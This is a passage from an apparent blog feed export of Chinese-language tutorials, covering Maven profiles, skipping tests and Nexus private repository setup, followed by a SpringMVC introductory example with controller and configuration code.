punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdbc.url</span><span class="token punctuation">></span></span>jdbc:mysql://127.2.2.1:3306/ssm_db<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdbc.url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        测试环境--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>env_test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdbc.url</span><span class="token punctuation">></span></span>jdbc:mysql://127.3.3.1:3306/ssm_db<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdbc.url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profiles</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用多环境（构建过程）</p><pre class="line-numbers language-none"><code class="language-none">mvn 指令 -P 环境定义IDmvn install -P pro_env<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="52-跳过测试"><a class="markdownIt-Anchor" href="#52-跳过测试">#</a> 5.2 跳过测试</h2><ul><li>应用场景<ul><li>功能更新中并且没有开发完毕</li><li>快速打包</li><li>…</li></ul></li></ul><ol><li><p>可以在 IDEA 控制器中直接选择跳过测试，但是会跳过所有测试</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221012094822435.png" alt="image-20221012094822435"></p></li><li><p>使用指令跳过测试</p><pre class="line-numbers language-none"><code class="language-none">mvn 指令 -D skipTestmvn install -D skipTest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行的项目构建指令必须包含测试生命周期，否则无效果。例如执行 compile 生命周期，不经过 test 生命周期</p></li><li><p>细粒度控制跳过测试 —— 插件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-surefire-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.12.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>            <span class="token comment">&lt;!--                    如果值为true则跳过，和点控制器一样，如果是false则不跳过  --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>skipTests</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>skipTests</span><span class="token punctuation">></span></span>            <span class="token comment">&lt;!--         值为false时，设置排除掉不参与测试的内容--></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">></span></span>**/BookServiceTest.java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="6-私服"><a class="markdownIt-Anchor" href="#6-私服">#</a> 6、私服</h1><h2 id="61-私服简介"><a class="markdownIt-Anchor" href="#61-私服简介">#</a> 6.1 私服简介</h2><ul><li><p>私服是一台独立的服务器，用于解决团队内部的资源共享与资源同步的问题</p></li><li><p>Nexus</p><ul><li>Sonatype 公司的一款 maven 私服产品</li><li>下载地址：<a href="https://help.sonatype.com/repomanager3/product-information/download">https://help.sonatype.com/repomanager3/product-information/download</a></li></ul></li><li><p>启动服务器（命令行启动）</p><pre class="line-numbers language-none"><code class="language-none">nexus.exe &#x2F;run nexus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>访问服务器：默认端口 8081</p></li><li><p>修改基础配置信息：</p><ul><li>安装路径下 etc 目录中的 nexus-default.properties 文件保存有 nexus 基础配置信息，例如默认端口访问</li></ul></li><li><p>修改服务器运行配置信息</p><ul><li>安装路径下 bin 目录中 nexus.vmoptions 文件保存有 nexus 服务器启动对应的配置信息，例如默认占用内存空间</li></ul></li></ul><h2 id="62-私服资源操作流程分析"><a class="markdownIt-Anchor" href="#62-私服资源操作流程分析">#</a> 6.2 私服资源操作流程分析</h2><ul><li>私服中是通过仓库存储文件的</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221012162903648.png" alt="image-20221012162903648"></p><ul><li>私服仓库分类</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221012162942314.png" alt="image-20221012162942314"></p><h2 id="63-资源上传与下载"><a class="markdownIt-Anchor" href="#63-资源上传与下载">#</a> 6.3 资源上传与下载</h2><h3 id="631-资源下载"><a class="markdownIt-Anchor" href="#631-资源下载">#</a> 6.3.1 资源下载</h3><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221012163228019.png" alt="image-20221012163228019"></p><ul><li><p>配置位置：setting.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 配置私服访问权限 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>私服中的服务器ID名称，就是repository的name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>repouser<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>repopwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>server</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 私服的访问路径 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>mirrorId<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span> 用私服组仓库的name值    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span> *表示所有的都来自私服    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://my.repository.com/repo/path<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span> 组仓库<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="632-资源上传"><a class="markdownIt-Anchor" href="#632-资源上传">#</a> 6.3.2 资源上传</h3><ul><li>资源上传需要和资源下载一样配置私服访问权限，之后在 pom 中配置上传的具体位置</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--配置当前工程保存在私服中的具体位置--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>distributionManagement</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        发布到正式版仓库--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>仓库的name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>仓库的url<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        发布到临时版仓库--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>snapshotRepository</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>仓库的name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>仓库的url<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>snapshotRepository</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>distributionManagement</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>使用 maven 的 deploy 指令将项目上传到 maven 中，首次发布需要保证项目中用到的所有东西在私服中都存在，因此会下载很多东西</li><li>父项目进行了配置之后，子项目如果没有配置继承父项目要进行配置</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221012213532286.png" alt="image-20221012213532286"></p><ul><li><p>工程发布的时候版本号会影响上传到哪个仓库</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.augseventh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven_01_parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>发布命令：</p><pre class="line-numbers language-maven" data-language="maven"><code class="language-maven">mvn deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-分模块开发与设计&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-分模块开发与设计&quot;&gt;#&lt;/a&gt; 1、分模块开发与设计&lt;/h1&gt;
&lt;h2 id=&quot;11-分模块开发意义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>SpringMVC</title>
    <link href="http://example.com/post/SpringMVC.html"/>
    <id>http://example.com/post/SpringMVC.html</id>
    <published>2022-10-12T13:54:41.000Z</published>
    <updated>2022-10-12T13:51:08.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-springmvc概述"><a class="markdownIt-Anchor" href="#1-springmvc概述">#</a> 1、SpringMVC 概述</h1><ul><li>SpringMVC 技术与 Servlet 技术功能等同，均属于 web 层开发技术</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220926165053790.png" alt="image-20220926165053790"></p><ul><li>SpringMVC 是一种基于 java 实现 MVC 模型的轻量级 web 框架</li><li>优点<ul><li>使用简单，开发便捷（相比于 Servlet）</li></ul></li></ul><h1 id="2-springmvc入门案例"><a class="markdownIt-Anchor" href="#2-springmvc入门案例">#</a> 2、SpringMVC 入门案例</h1><ol><li><p>使用 SpringMVC 技术需要先导入 SpringMVC 坐标与 Servlet 坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-webmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> 导入的包和spring-context版本一致    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建 SpringMVC 控制器类（等同于 Servlet 功能）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token comment">//2.定义controller</span><span class="token comment">//2.1使用@Controller来定义bean</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//2.2设置当前操作的访问路径</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/save"</span><span class="token punctuation">)</span>    <span class="token comment">//2.3设置当前操作返回值类型</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'mvc'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化 SpringMVC 环境（同 Spring 环境），设定 SpringMVC 加载对应的 bean</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token comment">//3.创建SpringMVC的配置文件，加载controller对应的bean</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima.controller"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMVCConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化 Servlet 容器，加载 SpringMVC 环境，并设置 SpringMVC 技术处理的请求</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">AnnotationConfigWebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">AbstractDispatcherServletInitializer</span></span><span class="token punctuation">;</span><span class="token comment">//4.定义一个Servlet容器配置的启动类，在里面加载spring的配置</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//加载spring容器配置</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigWebApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ctx<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//设置哪些请求归属springMVC处理</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//表示所欲请求归SpringMVC处理</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//加载spring容器配置</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createRootApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ul><li><p>使用的注解：</p><ul><li><p>@Controller</p><ul><li><p>类型：类注释</p></li><li><p>位置：SpringMVC 控制器类定义上方</p></li><li><p>作用：设定 SpringMVC 的核心控制器 bean</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>@RequestMapping</p><ul><li><p>类型：方法注释</p></li><li><p>位置：SpringMVC 控制器方法定义上方</p></li><li><p>作用：设置当前控制器方法请求访问路径</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/save"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>相关属性：value (默认)：请求访问路径</p></li></ul></li><li><p>@ResponseBody</p><ul><li><p>类型：方法注释</p></li><li><p>位置：SpringMVC 控制器方法定义上方</p></li><li><p>作用：设置当前控制器方法响应内容为当前返回值，无需解析</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/save"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'mvc'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul></li></ul><h1 id="3-入门案例总结"><a class="markdownIt-Anchor" href="#3-入门案例总结">#</a> 3、入门案例总结</h1><ul><li><p>SpringMVC 入门程序开发总结 (1+N)</p><ul><li>一次性工作<ul><li>创建工程，设置服务器，加载工程</li><li>导入坐标</li><li>创建 web 容器类，加载 SpringMVC 配置，并设置 SpringMVC 请求拦截路径</li><li>SpringMVC 核心配置类（设置配置类，扫描 controller 包，加载 controller 控制器 bean）</li></ul></li><li>多次工作<ul><li>定义处理请求的控制类</li><li>定义处理请求的控制器方法，并配置映射路径（@RequestMapping）与返回 json 数据（@ResponseBody）</li></ul></li></ul></li><li><p>AbstractDispatcherServletInitializer 类是 SpringMVC 提供的快速初始化 web3.0 容器的抽象类</p></li><li><p>AbstractDispatcherServletInitializer 提供三个接口方法供用户实现</p><ul><li><p>createServletApplicationContext () 方法，创建 Servlet 容器时，加载 SpringMVC 对应的 bean 并放入 WebApplicationContext 对象范围中，而 WebApplicationContext 的作用范围为 ServletContext 范围，即整个 web 容器范围</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span 